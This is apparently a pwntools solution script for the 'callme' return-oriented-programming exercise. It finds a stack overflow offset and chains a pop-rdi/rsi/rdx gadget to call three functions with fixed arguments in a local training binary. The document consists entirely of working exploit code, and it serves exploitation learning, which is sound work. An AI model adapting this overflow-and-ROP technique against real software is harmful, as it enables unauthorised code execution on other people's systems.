#!/usr/bin/env python3
from pwn import *

# set up context
elf = context.binary = ELF('callme')
context.log_level = 'debug'

# find offset
io = process(elf.path)
io.sendline(cyclic(128))
io.wait()
core = io.corefile
stack = core.rsp
offset = core.read(stack, 4)

# craft payload
'''
Stack layout:

--- HIGH ---
funcptr -> callme_three@plt
arg     -- 0xd00df00dd00df00d
arg     -- 0xcafebabecafebabe
arg     -- 0xdeadbeefdeadbeef
gadget  -> pop rdi ; pop rsi ; pop rdx ; ret

funcptr -> callme_two@plt
arg     -- 0xd00df00dd00df00d
arg     -- 0xcafebabecafebabe
arg     -- 0xdeadbeefdeadbeef
gadget  -> pop rdi ; pop rsi ; pop rdx ; ret

funcptr -> callme_one@plt
arg     -- 0xd00df00dd00df00d
arg     -- 0xcafebabecafebabe
arg     -- 0xdeadbeefdeadbeef
gadget  -> pop rdi ; pop rsi ; pop rdx ; ret
--- LOW  ---

'''

pop_args = 0x000000000040093c  # pop rdi; pop rsi; pop rdx; ret;
arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

payload = flat(
    { offset : pop_args },
    arg1,
    arg2,
    arg3,
    elf.symbols.callme_one,

    pop_args,
    arg1,
    arg2,
    arg3,
    elf.symbols.callme_two,

    pop_args,
    arg1,
    arg2,
    arg3,
    elf.symbols.callme_three,
)
open('payload.bin', 'wb').write(payload)

io = process(elf.path)
io.recvuntil('> ')
io.sendline(payload)
print(io.recvall().decode('utf-8'))
